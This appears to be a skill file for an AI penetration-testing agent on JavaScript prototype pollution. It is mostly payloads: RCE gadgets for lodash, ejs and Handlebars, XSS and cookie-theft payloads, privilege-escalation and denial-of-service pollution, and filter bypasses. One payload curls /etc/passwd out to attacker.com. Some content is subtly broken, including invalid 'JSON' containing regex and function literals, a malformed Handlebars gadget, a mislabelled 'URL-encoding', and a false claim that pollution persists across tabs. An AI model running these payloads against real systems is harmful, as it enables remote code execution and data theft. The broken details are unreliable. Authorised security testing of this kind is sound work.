---
name: prototype_pollution
description: Prototype pollution testing for JavaScript prototype chain manipulation, gadget chain exploitation, and RCE/XSS via polluted properties
---

# Prototype Pollution

Prototype pollution modifies JavaScript object prototypes via `__proto__`, `constructor.prototype`, or `Object.create` inheritance paths. In Node.js backends this escalates to RCE through library gadget chains; in browsers it enables XSS via DOM property clobbering and rendering gadgets. Every JSON-parsing endpoint is a potential surface.

## Attack Surface

**Scope**
- Any endpoint accepting JSON body, URL query params, or cookie values parsed into JS objects
- Deep merge, clone, or assign operations (`_.merge`, `Object.assign`, `deep-extend`, `merge-deep`)
- Express body-parser, qs library (nested query strings), multipart parsers
- Client-side `location.hash`, `postMessage` data, WebSocket messages parsed as objects

**Key Properties**
- `__proto__` — direct prototype chain manipulation
- `constructor.prototype` — alternative path when `__proto__` is filtered
- `Object.setPrototypeOf` — runtime prototype reassignment

**Common Sinks**
- `res.render()` options pollution (Express Handlebars/Pug/EJS)
- `child_process.spawn` / `exec` argument pollution
- `fs.readFile` / `require()` path pollution
- `vm.runInContext` / `eval` / `Function()` code pollution
- DOM sinks: `innerHTML`, `document.createElement`, `setAttribute`

## High-Value Targets

### Server-Side RCE Gadgets

**Express + Handlebars (<4.4.4)**
```json
{"__proto__": {"type": "Program", "body": [{"type": "ExpressionStatement","expression": {"type": "CallExpression","callee": {"type": "MemberExpression","object": {"type": "Identifier","name": "global.process.mainModule.require"},"property": {"type": "Identifier","name": "for_each"}}}]}}
```

**lodash.merge (<4.17.21)**
```json
{"__proto__": {"templateSettings": {"interpolate": /\{\{.*?\}\}/g}, "interpolate": "{{global.process.mainModule.require('child_process').execSync('id') }}"}}
```

**Node.js child_process via custom gadgets**
```json
{"__proto__": {"shell": true, "argv0": "id", "NODE_OPTIONS": "--require=eval(\"require('child_process').execSync('curl attacker.com/?c='+require('fs').readFileSync('/etc/passwd').toString())\")"}}
```

**ejs (<3.1.7)**
```json
{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');var __tmp2"}}
```

### Client-Side XSS Gadgets

**jQuery $.extend deep merge (<3.4.0)**
```json
{"__proto__": {"context": document, "selector": "<img src=x onerror=alert(1)>"}}
```

**DOM innerHTML clobbering**
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.cookie)>"}}
```

**Document.cookie exfil via toString override**
```json
{"__proto__": {"toString": function(){ return document.cookie }, "cookie": true}}
```

**Object.create pollution path**
```js
// Pollution via Object.create(null) bypass — attacker targets
// Object.prototype directly instead of __proto__ on instance
// Example: pollute Object.prototype.isAdmin = true
// All objects inherit the property unless explicitly frozen
```

**polluted via constructor.prototype**
```json
{"constructor": {"prototype": {"isAdmin": true, "role": "admin"}}}
```
Effective when `__proto__` key is filtered at top level but nested constructor access is not.

### Framework-Specific Gadget Chains

**Handlebars (<4.7.7) — Server-Side Template Injection**
```json
{"__proto__": {"serverSide": true, "compileDebug": true}}
```
Pollute template options to enable server-side rendering mode and debug output, exposing internal paths.

**Pug (Jade)**
```json
{"__proto__": {"self": true, "debug": true, "pretty": true}}
```
Pollute Pug options to alter rendering behavior and leak internal state through error messages.

**Mongoose (<5.13.3)**
```json
{"__proto__": {"schema": {"paths": {"role": {"default": "admin"}}}}}
```
Pollute schema defaults to escalate privileges on next document creation.

**underscore.js (<1.13.6)**
```json
{"__proto__": {"templateSettings": {"interpolate": /\{\{(.+?)\}\}/g}}}
```
Override template delimiter settings to inject code in any template rendering.

**express-fileupload**
```json
{"__proto__": {"parseNested": true, "useTempFiles": true, "tempFileDir": "/tmp/evil"}}
```
Pollute file upload options to change parsing behavior or temp file locations.

## Bypass Techniques

**Filter Evasion**
- URL-encode `__proto__` as `__pro__proto__to__` when filter strips recursively (bypasses single-pass sanitizers)
- Use `constructor[prototype]` or `constructor.prototype` with bracket notation
- Unicode escapes: `\u005f\u005fproto\u005f\u005f`
- Use nested JSON path: `{"a":{"__proto__":{"polluted":"yes"}}}` when shallow keys are checked
- qs library nested params: `?__proto__[polluted]=yes` or `?constructor[prototype][polluted]=yes`
- Cookie-based: set `Cookie: {"__proto__":{"admin":true}}` if app parses cookies as JSON

**Timing-Based Detection**
- Pollute `__proto__.sleep` with `while(true){}` or `process.exit` — observe crash/hang
- Pollute `toString` with `Date.now` delta to detect code path changes

## Testing Methodology

1. **Identify merge targets** — Scan source for `Object.assign`, spread operators, lodash `_.merge`/`_.cloneDeep`, `deep-extend`, `merge-deep`, jQuery `$.extend(true,...)`
2. **Fuzz entry points** — POST JSON `{"__proto__":{"prometheus":"polluted"}}` to every endpoint accepting JSON
3. **Confirm pollution** — Request any object and check if `{}.prometheus === "polluted"` or trigger `/constructor/prototype/prometheus` path
4. **Enumerate gadgets** — Map the dependency tree (`npm ls`, `yarn list`, lockfile analysis) for known gadget libraries
5. **Test query string vectors** — `?__proto__[polluted]=yes` via qs (Express default), test URL-encoded and bracket-notated forms
6. **Cookie vectors** — If cookies are parsed as JSON, inject via `Set-Cookie`
7. **Test client-side** — Inject via `postMessage`, `location.hash`, `localStorage` manipulation
8. **Chain to impact** — Map gadget to RCE/XSS/DoS and prove with harmless payload (e.g., `require('child_process').execSync('id')`)

## Validation

1. Confirm pollution persists across objects: `({}).prometheus_polluted === true` after payload
2. Demonstrate sink activation: rendering error, callback execution, or output change
3. For RCE gadgets: show command execution output (use harmless `id` or `whoami`)
4. For XSS gadgets: demonstrate DOM manipulation in a controlled context
5. Document the exact merge function, entry point, and gadget chain

## False Positives

- Properties set on own object, not inherited (not true pollution)
- Frozen/sealed prototypes (`Object.freeze(Object.prototype)`) blocking actual pollution
- Sandboxed environments where `__proto__` is stripped before merge
- Log output reflecting the literal string `__proto__` without actual prototype modification
- Applications using `Object.create(null)` for internal objects (no prototype chain)

## Impact

- Remote Code Execution on Node.js servers via gadget chains
- Cross-Site Scripting via DOM property clobbering and rendering gadgets
- Authentication bypass by polluting `isAdmin`, `role`, or access control properties
- Denial of Service via `toString`/`valueOf` overrides causing infinite loops or crashes
- Property injection across all instances sharing the polluted prototype

## Pro Tips

1. Always check the lockfile — `package-lock.json` / `yarn.lock` reveal exact versions of vulnerable libraries
2. Test `constructor.prototype` path alongside `__proto__`; many filters miss it
3. Use `qs` library behavior: `?a[__proto__][b]=c` creates nested objects — test even if JSON body is filtered
4. For Express: pollute `app.locals` or `res.locals` via merge on settings objects
5. Browser PP: test `Object.prototype` pollution persistence across page navigation (affects all tabs)
6. Monitor `process.env` pollution — `NODE_OPTIONS`, `LD_PRELOAD` are RCE vectors
7. Use property-access gadgets: polluting `valueOf`, `toString`, `toJSON`, `then` (promise) for indirect execution
8. Automated: run `ppfuzz -w wordlist.txt -u TARGET` and `prototype-pollution-sniffer` for known gadget detection
